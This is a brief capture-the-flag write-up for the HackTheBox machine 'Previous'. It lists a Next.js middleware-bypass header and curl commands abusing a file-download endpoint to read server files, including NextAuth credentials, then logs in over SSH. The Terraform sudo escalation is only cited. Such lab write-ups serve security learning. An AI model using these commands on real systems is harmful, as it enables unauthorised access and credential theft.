# HackTheBox - Previous
**Youtube video:** https://youtu.be/DTeTx3HInyM
---
## Initial Foothold

**Enumeration:**
```bash
# Nuclei scan with headless mode
nuclei -fr -target http://previous.htb -headless
```

**Burp Suite Configuration:**
- Add interception rules for `.js` files
- Add custom header in "Match and Replace" rules:
```
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```
- Apply to all pages accessing `/docs`

**LFI Exploitation:**
```bash
# LFI via download API endpoint
curl http://previous.htb/api/download?example=/proc/self/cwd/package.json

# Download and build application locally
npm install
npm run build

# Extract routes manifest
curl http://previous.htb/api/download?example=/proc/self/cwd/.next/routes-manifest.json

# Extract NextAuth credentials
curl http://previous.htb/api/download?example=/proc/self/cwd/.next/server/pages/api/auth/[...nextauth].js
```

**SSH Access:**
```bash
ssh user@$IP
# Password: [extracted from NextAuth file]
```

---
## Priv Esc

**Exploit:** Terraform sudo misconfiguration
- Reference: https://gist.github.com/strikoder/13843b6b7943a19bcd989de57f8a6880
```bash
# Check sudo permissions
sudo -l

# Terraform privilege escalation
[commands from exploit]
```
